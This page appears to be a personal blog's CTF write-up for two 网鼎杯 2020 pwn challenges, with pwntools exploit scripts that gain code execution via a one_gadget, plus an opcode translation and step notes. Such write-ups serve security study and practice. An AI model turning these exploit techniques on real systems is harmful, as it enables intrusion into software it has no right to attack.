@@ -1,0 +1,459 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no" />
+<meta name="author" content="风沐云烟" />
+
+
+
+<meta name="description" content="TTTTTTTTCL,菜鸟不配打CTF,和De1CTF一样,打过之后才知道自己是多么的菜">
+<meta name="keywords" content="PWN,Partional,网鼎杯_2020">
+<meta property="og:type" content="article">
+<meta property="og:title" content="网鼎杯_2020">
+<meta property="og:url" content="http:&#x2F;&#x2F;fmyy.pro&#x2F;2020&#x2F;05&#x2F;10&#x2F;Competition&#x2F;%E7%BD%91%E9%BC%8E%E6%9D%AF-2020&#x2F;index.html">
+<meta property="og:site_name" content="FMYY&#39;s Blog">
+<meta property="og:description" content="TTTTTTTTCL,菜鸟不配打CTF,和De1CTF一样,打过之后才知道自己是多么的菜">
+<meta property="og:locale" content="en">
+<meta property="og:updated_time" content="2020-05-13T11:30:34.861Z">
+<meta name="twitter:card" content="summary">
+
+<link rel="apple-touch-icon" href= "/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="FMYY&#39;s Blog" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/favicon.png">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>网鼎杯_2020 | FMYY&#39;s Blog</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: true
+    }
+</script>
+
+
+    <script> yiliaConfig.jquery_ui = [false]; </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+
+</head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/avatar.png" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">风沐云烟</a></h1>
+        </hgroup>
+
+        
+
+        
+            <form id="search-form">
+            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="true" />
+            <i class="fa fa-times" onclick="resetSearch()"></i>
+            </form>
+            <div id="local-search-result"></div>
+            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
+        
+
+
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/links/">友链</a></li>
+                        
+                            <li><a href="/archives/">文章</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" href="mailto:itassel@outlook.com" target="_blank" rel="noopener" title="Email"></a>
+                            
+                                <a class="fa RSS" href="/atom.xml" title="RSS"></a>
+                            
+                                <a class="fa QQ" href="tencent://message/?uin=29979004&Site=FMYY&Menu=yes" target="_blank" rel="noopener" title="QQ"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://caoyi.site" target="_blank" rel="noopener">Am473ur</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://wh1sper.cn/" target="_blank" rel="noopener">Wh1sper</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://leukpoint.top/" target="_blank" rel="noopener">LeukPoint</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://youn9.top/" target="_blank" rel="noopener">Youn9</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">2020的划水Pwn手,别人学一天的内容我需要看一个星期</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">风沐云烟</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/avatar.png" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">风沐云烟</a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/links/">友链</a></li>
+                
+                    <li><a href="/archives/">文章</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" target="_blank" href="mailto:itassel@outlook.com" title="Email"></a>
+                            
+                                <a class="fa RSS" target="_blank" href="/atom.xml" title="RSS"></a>
+                            
+                                <a class="fa QQ" target="_blank" href="tencent://message/?uin=29979004&Site=FMYY&Menu=yes" title="QQ"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="Tags" friends="Friends" about="About Me"/>
+</nav>
+      <div class="body-wrap"><article id="post-Competition/网鼎杯-2020" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2020/05/10/Competition/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020/" class="article-date">
+      <time datetime="2020-05-10T10:27:37.000Z" itemprop="datePublished">2020-05-10</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      网鼎杯_2020
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PWN/" rel="tag">PWN</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Partional/" rel="tag">Partional</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020/" rel="tag">网鼎杯_2020</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>TTTTTTTTCL,菜鸟不配打CTF,和De1CTF一样,打过之后才知道自己是多么的菜</p>
+<a id="more"></a>
+<h2 id="boom1"><a href="#boom1" class="headerlink" title="boom1"></a>boom1</h2><p><a href="./boom1/exp.py">Exploit</a> <a href="./boom1/main">Main</a> <a href="./boom1/libc-2.23.so">LIBC</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"><span class="comment">#from LD import*</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line"><span class="comment">#LD=change_ld('./main','./ld-2.23.so')</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line"><span class="comment">#p = LD.process(env=&#123;'LD_PRELOAD':'./libc-2.23.so'&#125;)</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">libc =ELF(<span class="string">'./libc-2.23.so'</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">p = remote(<span class="string">'182.92.73.10'</span>,<span class="number">24573</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">context.log_level =<span class="string">'DEBUG'</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">payload = <span class="string">'''</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line"><span class="string">char *s;</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line"><span class="string">char *n;</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line"><span class="string">char *ptr;</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line"><span class="string">int main()</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line"><span class="string">&#123;</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line"><span class="string">s = "FMYY";</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line"><span class="string">n = s - (0x7F8FE6E5C028 - 0x7F8FE6933000);</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line"><span class="string">s = n + 6229832 - 3848 + 8;</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line"><span class="string">s[0] = 0;</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line"><span class="string">s = n + 6229832;</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line"><span class="string">ptr = 0xCD0F3 + n;</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line"><span class="string">s[0] = (ptr)&amp;0xFF;</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line"><span class="string">s[1] = (ptr&gt;&gt;8)&amp;0xFF;</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line"><span class="string">s[2] = (ptr&gt;&gt;16)&amp;0xFF;</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line"><span class="string">printf("%p %p %p",n,ptr,*(int *)s);</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">24</span></pre></td><td class="code"><pre><span class="line"><span class="string">&#125;'''</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">25</span></pre></td><td class="code"><pre><span class="line">payload = payload.replace(<span class="string">'\n'</span>,<span class="string">''</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">26</span></pre></td><td class="code"><pre><span class="line">p.sendline(payload)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">27</span></pre></td><td class="code"><pre><span class="line">p.interactive()</span></pre></td></tr></table></figure>
+<p>程序的作用就是可编译执行写好的C代码,限制也比较多,利用黑盒做的,经过学长的提点之后,C代码可实现任意写  </p>
+<pre><code>1.在C代码中,定义在int main之外的指针变量是位于libc上面的,然后可以通过计算获得指针变量对于libc_base的偏移量,然后修改指针的指向,令指针n指向libc_base  
+2.由于libc-2.23中所有的one_gadget皆不满足执行条件,只能手动修改,通过四则运算与动态调试后,令[_rtld_global+8] == 0,则可满足0xCD0F3的执行条件  
+3.后续则是计算_dl_rtld_lock_recursive的偏移量,单字节修改末三位字节为one_gadget</code></pre><h2 id="boom2"><a href="#boom2" class="headerlink" title="boom2"></a>boom2</h2><p>题是一个VMPWN,程序在输入结束后,初始化了一个虚拟机栈,后面则是分析那个while怪物,翻译成能读懂的语言,修改返回地址为one_gadget<br>下面是我分析的代码,因为当初就是VMRE卡住了,才开始学的PWN,所以翻译出来不知道错误怎样,希望看到博客的师傅们能指出我的错误,感谢<br><a href="./boom2/exp.py">Exploit</a> <a href="./boom2/main">Main</a> <a href="./boom2/libc-2.23.so">LIBC</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">虚拟栈初始化完之后,RSP+0X18 = SP; RSP+0X20 = BP; RSP+0X28 = RA;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">00:	RA = BP + OPCODE*8</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">01:	RA = OPCODE</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">06:	PUSH BP</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">	MOV BP,SP</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">	SUB SP,OPCODE*8</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">08:	MOV SP,BP</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">	POP BP</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">09:	RA = [RA]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">10:	AL = [RA]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">11:	[[SP]] = RA</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">	ADD SP,8</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">12:	[[SP]] = RA</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">	RA = [SP]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">	ADD SP,8</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">13:	PUSH RA</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">14:	RA = [SP] | RA</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">	ADD SP,8</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">15:	RA = [SP] ^ RA</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">	ADD SP,8</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line">16:	RA = [SP] &amp; RA	</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line">	ADD SP,8</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line">17:	<span class="keyword">if</span> [SP] == RA</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">24</span></pre></td><td class="code"><pre><span class="line">		RA = 1</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">25</span></pre></td><td class="code"><pre><span class="line">	<span class="keyword">else</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">26</span></pre></td><td class="code"><pre><span class="line">		RA = 0</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">27</span></pre></td><td class="code"><pre><span class="line">	ADD SP,8</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">28</span></pre></td><td class="code"><pre><span class="line">18:	<span class="keyword">if</span> [SP] != RA</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">29</span></pre></td><td class="code"><pre><span class="line">		RA = 1</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">30</span></pre></td><td class="code"><pre><span class="line">	<span class="keyword">else</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">31</span></pre></td><td class="code"><pre><span class="line">		RA = 0</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">32</span></pre></td><td class="code"><pre><span class="line">	ADD SP,8</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">33</span></pre></td><td class="code"><pre><span class="line">19:	<span class="keyword">if</span> [SP] &lt; RA</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">34</span></pre></td><td class="code"><pre><span class="line">		RA = 1</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">35</span></pre></td><td class="code"><pre><span class="line">	<span class="keyword">else</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">36</span></pre></td><td class="code"><pre><span class="line">		RA = 0</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">37</span></pre></td><td class="code"><pre><span class="line">	ADD SP,8</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">38</span></pre></td><td class="code"><pre><span class="line">20:	<span class="keyword">if</span> [SP] &gt; RA</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">39</span></pre></td><td class="code"><pre><span class="line">		RA = 1</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">40</span></pre></td><td class="code"><pre><span class="line">	<span class="keyword">else</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">41</span></pre></td><td class="code"><pre><span class="line">		RA = 0</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">42</span></pre></td><td class="code"><pre><span class="line">	ADD SP,8</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">43</span></pre></td><td class="code"><pre><span class="line">21:	<span class="keyword">if</span> [SP] &lt;= RA</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">44</span></pre></td><td class="code"><pre><span class="line">		RA = 1</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">45</span></pre></td><td class="code"><pre><span class="line">	<span class="keyword">else</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">46</span></pre></td><td class="code"><pre><span class="line">		RA = 0</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">47</span></pre></td><td class="code"><pre><span class="line">	ADD SP,8</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">48</span></pre></td><td class="code"><pre><span class="line">22:	<span class="keyword">if</span> [SP] &gt;= RA</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">49</span></pre></td><td class="code"><pre><span class="line">		RA = 1</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">50</span></pre></td><td class="code"><pre><span class="line">	<span class="keyword">else</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">51</span></pre></td><td class="code"><pre><span class="line">		RA = 0</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">52</span></pre></td><td class="code"><pre><span class="line">	ADD SP,8</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">53</span></pre></td><td class="code"><pre><span class="line">23:	RA = [SP] &lt;&lt; RA</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">54</span></pre></td><td class="code"><pre><span class="line">	ADD SP,8</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">55</span></pre></td><td class="code"><pre><span class="line">24:	RA = [SP] &gt;&gt; RA</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">56</span></pre></td><td class="code"><pre><span class="line">	ADD SP,8</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">57</span></pre></td><td class="code"><pre><span class="line">25:	RA = [SP] + RA</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">58</span></pre></td><td class="code"><pre><span class="line">	ADD SP,8</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">59</span></pre></td><td class="code"><pre><span class="line">26: RA = [SP] - RA</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">60</span></pre></td><td class="code"><pre><span class="line">	ADD SP,8</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">61</span></pre></td><td class="code"><pre><span class="line">27:	RA = [SP] * RA</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">62</span></pre></td><td class="code"><pre><span class="line">	ADD SP,8</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">63</span></pre></td><td class="code"><pre><span class="line">28:	RA = [SP] / RA</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">64</span></pre></td><td class="code"><pre><span class="line">	ADD SP,8</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">65</span></pre></td><td class="code"><pre><span class="line">28:	RA = [SP] % RA</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">66</span></pre></td><td class="code"><pre><span class="line">	ADD SP,8</span></pre></td></tr></table></figure>
+<p>EXP概述</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">p = process(<span class="string">'./main'</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">MAX = <span class="number">0x10000000000000000</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">payload =  <span class="string">""</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">payload += p64(<span class="number">1</span>) + p64(<span class="number">0x5D4000</span> - <span class="number">0x45216</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">payload += p64(<span class="number">26</span>) </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">payload += p64(<span class="number">13</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">payload += p64(<span class="number">26</span>) <span class="comment">#just to make add sp,8</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">payload += p64(<span class="number">1</span>) + p64(<span class="number">0xE8</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">payload += p64(<span class="number">26</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">payload += p64(<span class="number">13</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">payload += p64(<span class="number">0</span>) + p64(MAX - <span class="number">5</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">payload += p64(<span class="number">9</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">payload += p64(<span class="number">11</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line"><span class="comment">#gdb.attach(p,"b* $rebase(0xE43)")</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">p.send(payload)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">p.interactive()</span></pre></td></tr></table></figure>
+
+<pre><code>1.首先利用1和26两个运算对栈顶位置的一个地址进行计算令其为rce地址保存在RA寄存器中,13运算将RA寄存器的值放回原来的栈顶位置
+2.第二次就需要出栈,令SP+8,同理修改保存的地址指向程序的返回地址,此时SP停留在初始化栈后的第二个位置
+3.利用0与9读取之前保存的rce地址,用11的二阶指针修改返回地址为rce即可</code></pre>
+      
+    </div>
+    
+  </div>
+  
+    
+
+
+    <nav id="article-nav">
+        
+            <div id="article-nav-newer" class="article-nav-title">
+                <a href="/2020/05/13/Competition/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020/boom2/note/">
+                    Competition/网鼎杯-2020/boom2/note
+                </a>
+            </div>
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2020/05/08/Kernel/Linux_Kernel_Pwn(%E4%BA%8C)/">
+                    Linux_Kernel_Pwn(ROP)
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">Contents</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#boom1"><span class="toc-number">1.</span> <span class="toc-text">boom1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#boom2"><span class="toc-number">2.</span> <span class="toc-text">boom2</span></a></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="Hide"  title="Show or Hide Table of Contents">
+
+    <script>
+        yiliaConfig.toc = ["Hide", "Show", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+
+    
+</div>
+
+
+
+
+
+
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2020/05/13/Competition/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020/boom2/note/" title="Pre: Competition/网鼎杯-2020/boom2/note">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+
+        <a title="Mini Archives"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2020/05/08/Kernel/Linux_Kernel_Pwn(%E4%BA%8C)/" title="Next: Linux_Kernel_Pwn(ROP)">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2020/05/13/Competition/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020/boom2/note/">Competition/网鼎杯-2020/boom2/note</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/05/10/Competition/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020/">网鼎杯_2020</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/05/08/Kernel/Linux_Kernel_Pwn(%E4%BA%8C)/">Linux_Kernel_Pwn(ROP)</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/05/06/Competition/De1CTF/">De1CTF</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/05/04/Kernel/Linux_Kernel_Pwn(%E4%B8%80)/">Linux_Kernel_Pwn(初识)</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/05/04/Competition/36DCTF/">36DCTF</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/29/StackOverFlow/Ret2dl-resolve/">ret2dl_runtime_resolve</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/27/AWD/XMAWD/">XMAWD</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/26/Magic/Magic-Gadget/">Magic_Gadget</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/25/Competition/DASCTF/">DASCTF</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/21/Competition/NPUCTF/">NPUCTF</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/20/Competition/HFCTF-2020/">HFCTF_2020</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/10/Large%20BIN%20Attack/Large-Bin-Attack/">Large_Bin_Attack</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/04/GMF/Global_Max_Fast/">Global_Max_Fast</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/31/IO_FILE/IO_FILE/">IO_FILE</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/18/TCache/TCache/">TCache</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/14/Competition/GXZY/">GXZY</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/01/Competition/V-N/">V&N公开赛</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/02/25/Competition/GYCTF/">GYCTF</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/01/22/Competition/HGame/">HGame</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/01/13/Seccomp/Seccomp/">Seccomp</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/12/27/StackOverFlow/BROP/">BROP</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/12/21/Reverse/Reverse-BOX/">Reverse_BOX</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/12/20/Reverse/WcyVM/">NCTF_WcyVM</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/12/17/Fmtstr/FmtStr_In_Heap/">FmtStr In Heap</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/12/16/Fmtstr/FmtStr_Blind_Got/">FmtStr Blind Got</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/12/10/StackOverFlow/ROP/">ROP</a></li><li class="post-list-item"><a 